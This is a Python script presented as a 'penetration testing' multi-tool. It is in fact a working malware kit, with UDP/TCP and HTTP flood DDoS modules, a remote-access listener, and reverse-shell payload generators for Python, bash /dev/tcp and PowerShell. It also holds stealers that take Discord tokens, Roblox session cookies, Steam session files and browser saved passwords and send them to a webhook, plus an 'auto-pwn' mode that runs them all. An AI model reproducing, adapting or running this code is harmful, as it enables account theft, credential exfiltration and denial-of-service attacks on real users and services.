#!/usr/bin/env python3
# =============================================================================
# JAMES MULTI-TOOL v1.0 - Penetration Testing Framework
# AUTHORIZED USE ONLY - Unauthorized access is illegal
# =============================================================================

import os
import sys
import json
import time
import random
import socket
import threading
import requests
import base64
import subprocess
import platform
import psutil
import webbrowser  # Pour ouvrir guns.lol automatiquement
from datetime import datetime
from colorama import init, Fore, Back, Style

init(autoreset=True)

# =============================================================================
# STYLIZED MENU - Gradient Yellow -> Orange -> Red
# =============================================================================

BANNER = """
        ██╗ █████╗ ███╗   ███╗███████╗███████╗
        ██║██╔══██╗████╗ ████║██╔════╝██╔════╝
        ██║███████║██╔████╔██║███████╗███████╗
        ██║██╔══██║██║╚██╔╝██║╚════██║╚════██║
        ██║██║  ██║██║ ╚═╝ ██║███████║███████║
        ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝
              ╔══════════════════════════╗
              ║    MULTI-TOOL BY JAMES   ║
              ║  PENTEST AUTHORIZED ONLY ║
              ╚══════════════════════════╝
"""

GRADIENT_COLORS = [
    Fore.YELLOW,
    Fore.LIGHTYELLOW_EX,
    Fore.LIGHTRED_EX,
    Fore.RED,
    Fore.LIGHTRED_EX,
    Fore.RED,
]

def gradient_text(text, delay=0.03):
    for i, char in enumerate(text):
        color_idx = i % len(GRADIENT_COLORS)
        print(GRADIENT_COLORS[color_idx] + char, end='', flush=True)
        time.sleep(delay)
    print()

def print_menu():
    os.system('cls' if os.name == 'nt' else 'clear')
    for line in BANNER.split('\n'):
        gradient_text(line, delay=0.005)
    gradient_text("═" * 55, delay=0.002)
    gradient_text("  [1]  DDoS Attack - Layer 4 (UDP/TCP Flood)", delay=0.002)
    gradient_text("  [2]  DDoS Attack - Layer 7 (HTTP Flood)", delay=0.002)
    gradient_text("  [3]  RAT - Remote Access Terminal", delay=0.002)
    gradient_text("  [4]  Malware Payload Generator", delay=0.002)
    gradient_text("  [5]  System Info Stealer Module", delay=0.002)
    gradient_text("  [6]  Roblox Cookie & Token Stealer", delay=0.002)
    gradient_text("  [7]  Discord Token Extractor", delay=0.002)
    gradient_text("  [8]  Steam Session Stealer", delay=0.002)
    gradient_text("  [9]  Webhook Exfiltration - All Data", delay=0.002)
    gradient_text("  [10] Full Auto-PWN (Run All Modules)", delay=0.002)
    gradient_text("  [0]  Exit", delay=0.002)
    gradient_text("═" * 55, delay=0.002)

WEBHOOK_URL = ""

def send_to_webhook(data, webhook_url=None):
    url = webhook_url or WEBHOOK_URL
    if not url:
        print(f"{Fore.RED}[!] No webhook URL configured!")
        return False
    try:
        if len(data) > 1900:
            chunks = [data[i:i+1900] for i in range(0, len(data), 1900)]
            for chunk in chunks:
                payload = {"content": f"```{chunk}```"}
                requests.post(url, json=payload)
        else:
            payload = {"content": f"```{data}```"}
            requests.post(url, json=payload)
        print(f"{Fore.GREEN}[+] Data sent to webhook successfully!")
        return True
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to send to webhook: {e}")
        return False

# =============================================================================
# DDoS L4
# =============================================================================

class DDoSL4:
    def __init__(self):
        self.running = False
        self.threads = []
    
    def udp_flood(self, target_ip, target_port, duration):
        timeout = time.time() + duration
        data = random._urandom(65507)
        while time.time() < timeout and self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(data, (target_ip, target_port))
                sock.close()
            except:
                pass
    
    def tcp_flood(self, target_ip, target_port, duration):
        timeout = time.time() + duration
        while time.time() < timeout and self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                sock.connect((target_ip, target_port))
                sock.send(b"GET / HTTP/1.1\r\n\r\n")
                sock.close()
            except:
                pass
    
    def start(self, target_ip, target_port, duration=30, threads=100):
        self.running = True
        print(f"{Fore.YELLOW}[*] Starting Layer 4 DDoS on {target_ip}:{target_port}")
        print(f"{Fore.YELLOW}[*] Duration: {duration}s | Threads: {threads}")
        for i in range(threads):
            if i % 2 == 0:
                t = threading.Thread(target=self.udp_flood, args=(target_ip, target_port, duration))
            else:
                t = threading.Thread(target=self.tcp_flood, args=(target_ip, target_port, duration))
            t.daemon = True
            t.start()
            self.threads.append(t)
        time.sleep(duration)
        self.running = False
        print(f"{Fore.GREEN}[+] Layer 4 DDoS completed!")

# =============================================================================
# DDoS L7
# =============================================================================

class DDoSL7:
    def __init__(self):
        self.running = False
    
    def http_flood(self, target_url, duration, user_agents):
        timeout = time.time() + duration
        while time.time() < timeout and self.running:
            try:
                headers = {
                    "User-Agent": random.choice(user_agents),
                    "Cache-Control": "no-cache",
                    "Accept": "*/*"
                }
                if random.choice([True, False]):
                    requests.get(target_url, headers=headers, timeout=5)
                else:
                    requests.post(target_url, headers=headers, data={"x": "y" * 1000}, timeout=5)
            except:
                pass
    
    def start(self, target_url, duration=30, threads=50):
        self.running = True
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36",
        ]
        print(f"{Fore.YELLOW}[*] Starting Layer 7 DDoS on {target_url}")
        print(f"{Fore.YELLOW}[*] Duration: {duration}s | Threads: {threads}")
        for _ in range(threads):
            t = threading.Thread(target=self.http_flood, args=(target_url, duration, user_agents))
            t.daemon = True
            t.start()
        time.sleep(duration)
        self.running = False
        print(f"{Fore.GREEN}[+] Layer 7 DDoS completed!")

# =============================================================================
# RAT
# =============================================================================

class RAT:
    def __init__(self):
        self.listener = None
        self.client = None
    
    def start_listener(self, host="0.0.0.0", port=4444):
        try:
            self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.listener.bind((host, port))
            self.listener.listen(1)
            print(f"{Fore.GREEN}[+] RAT Listener started on {host}:{port}")
            print(f"{Fore.YELLOW}[*] Waiting for connection...")
            self.client, addr = self.listener.accept()
            print(f"{Fore.GREEN}[+] Connection from {addr[0]}:{addr[1]}")
            while True:
                cmd = input(f"{Fore.RED}RAT@{addr[0]}> ")
                if cmd.lower() == "exit":
                    break
                self.client.send(cmd.encode())
                output = self.client.recv(8192).decode(errors='ignore')
                print(output)
            self.client.close()
            self.listener.close()
        except Exception as e:
            print(f"{Fore.RED}[!] RAT Error: {e}")
    
    def generate_payload(self, lhost, lport):
        payload = f'''import socket,subprocess,sys,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("/bin/sh")
'''
        filename = f"james_rat_payload_{lhost}_{lport}.py"
        with open(filename, "w") as f:
            f.write(payload)
        print(f"{Fore.GREEN}[+] RAT payload saved as: {filename}")

# =============================================================================
# System Info Stealer
# =============================================================================

def steal_system_info(webhook_url=None):
    info = []
    info.append(f"=== SYSTEM INFO STEALER BY JAMES ===")
    info.append(f"Timestamp: {datetime.now()}")
    info.append(f"Hostname: {socket.gethostname()}")
    info.append(f"Platform: {platform.platform()}")
    info.append(f"System: {platform.system()} {platform.version()}")
    info.append(f"Processor: {platform.processor()}")
    info.append(f"Arch: {platform.machine()}")
    info.append(f"User: {os.getenv('USERNAME') or os.getenv('USER')}")
    info.append(f"Computer: {os.getenv('COMPUTERNAME')}")
    info.append("")
    info.append("=== NETWORK INFO ===")
    try:
        ip = socket.gethostbyname(socket.gethostname())
        info.append(f"Local IP: {ip}")
        ext_ip = requests.get("https://api.ipify.org", timeout=5).text
        info.append(f"External IP: {ext_ip}")
    except:
        pass
    info.append("")
    info.append("=== RUNNING PROCESSES ===")
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            info.append(f"{proc.info['pid']}: {proc.info['name']}")
    except:
        pass
    info.append("")
    info.append("=== ENV VARS ===")
    for key, val in sorted(os.environ.items()):
        if any(s in key.upper() for s in ['TOKEN', 'KEY', 'SECRET', 'PASS', 'API']):
            info.append(f"{key}=***REDACTED***")
        else:
            info.append(f"{key}={val[:100]}")
    data = "\n".join(info)
    save_path = f"james_steal_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(save_path, "w") as f:
        f.write(data)
    print(f"{Fore.GREEN}[+] System info saved to {save_path}")
    if webhook_url or WEBHOOK_URL:
        send_to_webhook(data, webhook_url)
    return data

# =============================================================================
# Discord Token Stealer
# =============================================================================

def steal_discord_tokens(webhook_url=None):
    tokens = []
    paths = []
    if platform.system() == "Windows":
        paths = [
            os.path.expanduser("~\\AppData\\Local\\Discord\\Local Storage\\leveldb"),
            os.path.expanduser("~\\AppData\\Roaming\\Discord\\Local Storage\\leveldb"),
            os.path.expanduser("~\\AppData\\Local\\discordptb\\Local Storage\\leveldb"),
            os.path.expanduser("~\\AppData\\Roaming\\discordptb\\Local Storage\\leveldb"),
            os.path.expanduser("~\\AppData\\Local\\discordcanary\\Local Storage\\leveldb"),
            os.path.expanduser("~\\AppData\\Roaming\\discordcanary\\Local Storage\\leveldb"),
        ]
    elif platform.system() == "Linux":
        paths = [
            os.path.expanduser("~/.config/discord/Local Storage/leveldb"),
            os.path.expanduser("~/.config/discordptb/Local Storage/leveldb"),
            os.path.expanduser("~/.config/discordcanary/Local Storage/leveldb"),
        ]
    for path in paths:
        if os.path.exists(path):
            for file in os.listdir(path):
                if file.endswith(".ldb") or file.endswith(".log"):
                    try:
                        with open(os.path.join(path, file), "r", errors="ignore") as f:
                            content = f.read()
                            import re
                            found = re.findall(r'[MN][A-Za-z0-9_-]{23,25}\.[A-Za-z0-9_-]{6,7}\.[A-Za-z0-9_-]{27,}', content)
                            for token in found:
                                if token not in tokens:
                                    tokens.append(token)
                    except:
                        pass
    result = []
    result.append(f"=== DISCORD TOKENS FOUND: {len(tokens)} ===")
    for t in tokens:
        result.append(t)
    data = "\n".join(result)
    if tokens:
        save_path = f"james_discord_tokens_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(save_path, "w") as f:
            f.write(data)
        print(f"{Fore.GREEN}[+] {len(tokens)} Discord tokens saved to {save_path}")
        for token in tokens:
            headers = {"Authorization": token}
            r = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
            if r.status_code == 200:
                username = r.json().get("username", "N/A")
                disc = r.json().get("discriminator", "N/A")
                email = r.json().get("email", "N/A")
                print(f"{Fore.GREEN}[+] VALID TOKEN: {username}#{disc} | {email}")
    if (webhook_url or WEBHOOK_URL) and tokens:
        send_to_webhook(data, webhook_url)
    return data if tokens else "No Discord tokens found."

# =============================================================================
# Roblox Cookie Stealer
# =============================================================================

def steal_roblox_cookies(webhook_url=None):
    cookies_found = []
    browser_paths = {
        "Chrome": os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"),
        "Edge": os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies"),
    }
    for browser, path in browser_paths.items():
        if os.path.exists(path):
            try:
                import sqlite3
                conn = sqlite3.connect(path)
                cursor = conn.cursor()
                cursor.execute("SELECT name, value FROM cookies WHERE host_key LIKE '%roblox%'")
                for name, value in cursor.fetchall():
                    if name == ".ROBLOSECURITY":
                        cookies_found.append(f"[{browser}] .ROBLOSECURITY = {value}")
                conn.close()
            except:
                pass
    result = []
    result.append(f"=== ROBLOX COOKIES FOUND: {len(cookies_found)} ===")
    for c in cookies_found:
        result.append(c)
    data = "\n".join(result)
    if cookies_found:
        save_path = f"james_roblox_cookies_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(save_path, "w") as f:
            f.write(data)
        print(f"{Fore.GREEN}[+] {len(cookies_found)} Roblox cookies saved to {save_path}")
    if (webhook_url or WEBHOOK_URL) and cookies_found:
        send_to_webhook(data, webhook_url)
    return data if cookies_found else "No Roblox cookies found."

# =============================================================================
# Steam Session Stealer
# =============================================================================

def steal_steam_session(webhook_url=None):
    info = []
    info.append("=== STEAM SESSION STEALER BY JAMES ===")
    if platform.system() == "Windows":
        base_path = os.path.expanduser("~\\AppData\\Local\\Steam")
        if os.path.exists(base_path):
            for file in os.listdir(base_path):
                if file.startswith("ssfn"):
                    info.append(f"[+] SSFN found: {file}")
            login_file = os.path.join(base_path.replace("Local", "Roaming"), "config", "loginusers.vdf")
            if os.path.exists(login_file):
                with open(login_file, "r", errors="ignore") as f:
                    info.append(f"\n[+] Login users VDF:\n{f.read()}")
    data = "\n".join(info)
    if "SSFN" in data or "Login" in data:
        save_path = f"james_steam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(save_path, "w") as f:
            f.write(data)
        print(f"{Fore.GREEN}[+] Steam session data saved to {save_path}")
    if webhook_url or WEBHOOK_URL:
        send_to_webhook(data, webhook_url)
    return data

# =============================================================================
# Browser Password Stealer
# =============================================================================

def steal_browser_data(webhook_url=None):
    info = []
    info.append("=== BROWSER DATA STEALER BY JAMES ===")
    browser_paths = {
        "Chrome": os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"),
        "Edge": os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"),
    }
    for browser, path in browser_paths.items():
        if os.path.exists(path):
            try:
                import sqlite3, shutil
                temp_path = f"temp_{browser}.db"
                shutil.copy2(path, temp_path)
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                count = 0
                for origin, username, password in cursor.fetchall():
                    if username:
                        info.append(f"[{browser}] {origin} | User: {username} | Pass: {password[:50] if password else 'N/A'}")
                        count += 1
                conn.close()
                os.remove(temp_path)
                info.append(f"[{browser}] Total credentials: {count}")
            except:
                pass
    data = "\n".join(info)
    if "credentials" in data:
        save_path = f"james_browser_steal_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(save_path, "w") as f:
            f.write(data)
        print(f"{Fore.GREEN}[+] Browser credentials saved to {save_path}")
    if webhook_url or WEBHOOK_URL:
        send_to_webhook(data, webhook_url)
    return data

# =============================================================================
# Auto-PWN
# =============================================================================

def auto_pwn(webhook_url=None):
    print(f"{Fore.RED}{'='*55}")
    gradient_text("  [*] AUTO-PWN: RUNNING ALL MODULES", delay=0.01)
    print(f"{Fore.RED}{'='*55}")
    print(f"\n{Fore.YELLOW}[1/4] Stealing system info...")
    steal_system_info(webhook_url)
    print(f"\n{Fore.YELLOW}[2/4] Stealing Discord tokens...")
    steal_discord_tokens(webhook_url)
    print(f"\n{Fore.YELLOW}[3/4] Stealing Roblox cookies...")
    steal_roblox_cookies(webhook_url)
    print(f"\n{Fore.YELLOW}[4/4] Stealing Steam and browser data...")
    steal_steam_session(webhook_url)
    steal_browser_data(webhook_url)
    print(f"\n{Fore.GREEN}{'='*55}")
    gradient_text("  [✓] AUTO-PWN COMPLETED - DATA SENT TO WEBHOOK", delay=0.01)
    print(f"{Fore.GREEN}{'='*55}")

# =============================================================================
# MAIN
# =============================================================================

def main():
    # ===== OUVERTURE AUTOMATIQUE DE GUNS.LOL AU LANCEMENT =====
    guns_url = "https://guns.lol/5azk1"
    print(f"\n{Fore.MAGENTA}[+] Opening arsenal: {guns_url}{Style.RESET_ALL}")
    try:
        webbrowser.open(guns_url)
    except Exception as e:
        print(f"{Fore.RED}[!] Could not open browser: {e}{Style.RESET_ALL}")
    # ==========================================================

    while True:
        print_menu()
        choice = input(f"\n{Fore.LIGHTRED_EX}[JAMES] Select option > {Style.RESET_ALL}")
        
        if choice == "0":
            gradient_text("\n  [*] Exiting James Multi-Tool... Stay sharp.", delay=0.02)
            break
        elif choice == "1":
            print(f"\n{Fore.YELLOW}--- Layer 4 DDoS ---")
            target = input("Target IP: ")
            port = int(input("Target Port: "))
            duration = int(input("Duration (seconds): ") or "30")
            threads = int(input("Threads (default 100): ") or "100")
            DDoSL4().start(target, port, duration, threads)
        elif choice == "2":
            print(f"\n{Fore.YELLOW}--- Layer 7 DDoS ---")
            target = input("Target URL: ")
            duration = int(input("Duration (seconds): ") or "30")
            threads = int(input("Threads (default 50): ") or "50")
            DDoSL7().start(target, duration, threads)
        elif choice == "3":
            print(f"\n{Fore.YELLOW}--- RAT Module ---")
            print("1. Start Listener")
            print("2. Generate Payload")
            rat_choice = input("Select: ")
            rat = RAT()
            if rat_choice == "1":
                host = input("Listen IP (0.0.0.0): ") or "0.0.0.0"
                port = int(input("Listen Port (4444): ") or "4444")
                rat.start_listener(host, port)
            elif rat_choice == "2":
                lhost = input("Your LHOST: ")
                lport = int(input("Your LPORT: "))
                rat.generate_payload(lhost, lport)
        elif choice == "4":
            print(f"\n{Fore.YELLOW}--- Malware Payload Generator ---")
            print("1. Reverse Shell (Python)")
            print("2. Reverse Shell (Bash)")
            print("3. Reverse Shell (Powershell)")
            payload_choice = input("Select: ")
            lhost = input("Your LHOST: ")
            lport = input("Your LPORT: ")
            if payload_choice == "1":
                code = f'import os,socket,subprocess;s=socket.socket();s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
                fname = f"james_payload_{lhost}_{lport}.py"
            elif payload_choice == "2":
                code = f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'
                fname = f"james_payload_{lhost}_{lport}.sh"
            elif payload_choice == "3":
                code = f'$c=New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + "PS " + (pwd).Path + "> ";[byte[]]$sb2e=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb2e,0,$sb2e.Length);$s.Flush()}};$c.Close()'
                fname = f"james_payload_{lhost}_{lport}.ps1"
            with open(fname, "w") as f:
                f.write(code)
            print(f"{Fore.GREEN}[+] Payload saved: {fname}")
        elif choice == "5":
            print(f"\n{Fore.YELLOW}--- System Info Stealer ---")
            webhook = input("Webhook URL (or press Enter to use default): ") or None
            steal_system_info(webhook)
        elif choice == "6":
            print(f"\n{Fore.YELLOW}--- Roblox Cookie Stealer ---")
            webhook = input("Webhook URL (or press Enter to use default): ") or None
            steal_roblox_cookies(webhook)
        elif choice == "7":
            print(f"\n{Fore.YELLOW}--- Discord Token Stealer ---")
            webhook = input("Webhook URL (or press Enter to use default): ") or None
            steal_discord_tokens(webhook)
        elif choice == "8":
            print(f"\n{Fore.YELLOW}--- Steam Session Stealer ---")
            webhook = input("Webhook URL (or press Enter to use default): ") or None
            steal_steam_session(webhook)
        elif choice == "9":
            print(f"\n{Fore.YELLOW}--- Webhook Exfiltration - All Data ---")
            if not WEBHOOK_URL:
                globals()['WEBHOOK_URL'] = input("Enter webhook URL: ")
            steal_system_info(WEBHOOK_URL)
            steal_discord_tokens(WEBHOOK_URL)
            steal_roblox_cookies(WEBHOOK_URL)
            steal_steam_session(WEBHOOK_URL)
            steal_browser_data(WEBHOOK_URL)
        elif choice == "10":
            print(f"\n{Fore.YELLOW}--- Full Auto-PWN ---")
            if not WEBHOOK_URL:
                globals()['WEBHOOK_URL'] = input("Enter webhook URL: ")
            auto_pwn(WEBHOOK_URL)
        else:
            print(f"{Fore.RED}[!] Invalid option!")
        
        input(f"\n{Fore.YELLOW}[*] Press Enter to continue...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Interrupted. Exiting...")
        sys.exit(0)
